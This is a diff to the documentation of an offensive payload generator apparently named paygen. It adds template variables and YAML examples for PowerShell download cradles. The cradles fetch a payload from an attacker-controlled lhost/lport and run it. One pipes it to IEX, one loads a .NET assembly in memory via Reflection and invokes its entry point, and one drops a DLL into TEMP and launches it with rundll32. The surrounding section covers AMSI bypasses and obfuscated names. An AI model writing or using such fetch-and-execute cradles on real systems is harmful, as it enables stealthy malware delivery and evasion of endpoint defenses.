@@ -623,10 +623,14 @@ Defines AMSI bypasses and download cradles with optional obfuscation control.
 
 **Available Variables:**
 
-| Variable | Description | Example |
-|----------|-------------|---------|
-| `{url}` | Base URL constructed from lhost/lport (without filename) | `http://192.168.1.100:8080` or `https://192.168.1.100` |
-| `{output_file}` | Output filename from payload parameters | `payload.exe` |
+| Variable | Description | Example | Required |
+|----------|-------------|---------|----------|
+| `{url}` | Base URL constructed from lhost/lport (without filename) | `http://192.168.1.100:8080` or `https://192.168.1.100` | Always |
+| `{output_file}` | Output filename from payload parameters | `payload.exe` | Always |
+| `{namespace}` | .NET namespace for assembly loading | `MyApp` | Optional |
+| `{class}` | .NET class name containing entry point | `Program` | Optional |
+| `{entry_point}` | Entry point method/function name | `Main` or `DllMain` | Optional |
+| `{args}` | Command-line arguments for assembly invocation | `arg1 arg2` | Optional |
 
 **URL Construction Logic:**
 
@@ -638,7 +642,23 @@ The `{url}` variable contains only the base URL without the output filename:
 
 In YAML cradle templates, combine `{url}` with `{output_file}` like: `{url}/{output_file}`
 
-**Example:**
+**Assembly Loading Variables:**
+
+The optional variables `{namespace}`, `{class}`, `{entry_point}`, and `{args}` are used for advanced scenarios like in-memory assembly loading and invocation.
+
+**Auto-Extraction Behavior:**
+- When these variables are present in a cradle, paygen automatically extracts the values from the compiled C# payload
+- If C# obfuscation is enabled, the extracted names will be the obfuscated versions (e.g., "forest", "tree")
+- A checkbox allows manual override to specify custom values (disabled when C# obfuscation is active)
+- The `{args}` variable always requires manual input as it's runtime-specific
+
+**Variable Description:**
+- `{namespace}` - .NET namespace of the compiled assembly (e.g., "MyApp")
+- `{class}` - Class name containing the entry point (e.g., "Program")
+- `{entry_point}` - Entry point method name (e.g., "Main", "DllMain")
+- `{args}` - Command-line arguments for the payload (space-separated)
+
+**Example - Basic HTTP Download:**
 ```yaml
 - name: IWR-IEX (Standard)
   type: cradle-ps1
@@ -646,7 +666,26 @@ In YAML cradle templates, combine `{url}` with `{output_file}` like: `{url}/{out
     IWR -Uri "{url}/{output_file}" -UseBasicParsing | IEX
 ```
 
-This gives you full control over how the URL is constructed in each cradle template.
+**Example - Assembly Loading with Arguments:**
+```yaml
+- name: Assembly-Load-Invoke (EXE)
+  type: cradle-exe
+  code: |
+    $data = (New-Object System.Net.WebClient).DownloadData('{url}/{output_file}');
+    $assem = [System.Reflection.Assembly]::Load($data);
+    [{namespace}.{class}]::{entry_point}("{args}".Split())
+```
+
+**Example - DLL with Entry Point:**
+```yaml
+- name: DownloadFile (DLL)
+  type: cradle-dll
+  code: |
+    (New-Object System.Net.WebClient).DownloadFile("{url}/{output_file}", "$env:TEMP\{output_file}");
+    rundll32.exe "$env:TEMP\{output_file}",{entry_point}
+```
+
+This gives you full control over how the URL is constructed and how assemblies are loaded in each cradle template.
 
 **no-obf Flag:**
 
